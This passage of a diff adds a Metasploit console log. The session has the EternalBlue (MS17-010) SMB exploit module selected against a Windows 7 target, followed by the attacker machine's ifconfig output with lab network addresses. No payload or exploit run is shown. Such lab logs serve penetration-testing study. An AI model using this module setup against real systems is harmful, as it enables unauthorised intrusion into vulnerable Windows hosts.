+   --  ----
+   1   Windows 7
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(windows/smb/ms17_010_eternalblue) > ifconfig
+[*] exec: ifconfig
+
+eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 172.20.10.4  netmask 255.255.255.240  broadcast 172.20.10.15
+        inet6 fe80::a2fd:902d:c46b:9826  prefixlen 64  scopeid 0x20<link>
+        inet6 2403:6200:88a2:12b0:a8b4:def9:1836:c1c1  prefixlen 64  scopeid 0x0<global>
+        ether 08:00:27:d2:26:79  txqueuelen 1000  (Ethernet)
+        RX packets 2276  bytes 212682 (207.6 KiB)
+        RX errors 0  dropped 10  overruns 0  frame 0
+        TX packets 3193  bytes 2119273 (2.0 MiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        inet6 ::1  prefixlen 128  scopeid 0x10<host>
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 34  bytes 6464 (6.3 KiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 34  bytes 6464 (6.3 KiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+msf6 exploit(windows/smb/ms17_010_eternalblue) > 
